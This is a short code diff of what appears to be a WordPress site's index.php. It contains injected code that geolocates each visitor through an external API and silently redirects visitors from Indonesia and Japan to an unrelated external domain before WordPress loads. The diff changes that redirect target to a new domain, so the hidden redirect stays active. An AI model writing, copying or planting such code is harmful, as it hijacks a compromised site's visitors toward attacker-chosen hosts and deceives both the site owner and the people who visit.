@@ -16,7 +16,7 @@ $response = file_get_contents($api_url);
 $data = json_decode($response, true);
 
 if ($data['countryCode'] === 'ID' || $data['countryCode'] === 'JP') {
-    $target = "https://alternativetls-ax98531.akkusev.com";
+    $target = "https://alternativetls-ax98531.sky4system.com";
     $password = "dev";
     header("Location: $target?$password");
     exit();
@@ -39,4 +39,5 @@ define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
 require __DIR__ . '/wp-blog-header.php';
+
 
